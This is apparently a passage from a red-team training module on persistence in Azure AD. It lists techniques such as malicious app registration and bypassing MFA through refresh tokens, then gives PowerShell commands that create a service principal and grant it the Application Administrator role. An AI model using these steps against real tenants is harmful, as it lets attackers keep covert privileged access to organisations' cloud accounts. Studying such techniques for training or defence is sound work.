**6. Persistence**

- Register malicious applications with elevated privileges

- Create service principals or modify existing ones for long-term access

- Abuse refresh tokens or configure conditional access policies to
  bypass MFA

**Module 6: Persistence**

**Step 1: Register a Malicious Application**

\$app = New-AzureADApplication -DisplayName "PersistenceApp"
-IdentifierUris "https://persistence.app"

\$sp = New-AzureADServicePrincipal -AppId \$app.AppId

**Step 2: Assign Privileged Role to the Application**

\$role = Get-AzureADDirectoryRole \| Where-Object { \$\_.DisplayName -eq
"Application Administrator" }

Add-AzureADDirectoryRoleMember -ObjectId \$role.ObjectId -RefObjectId
\$sp.ObjectId
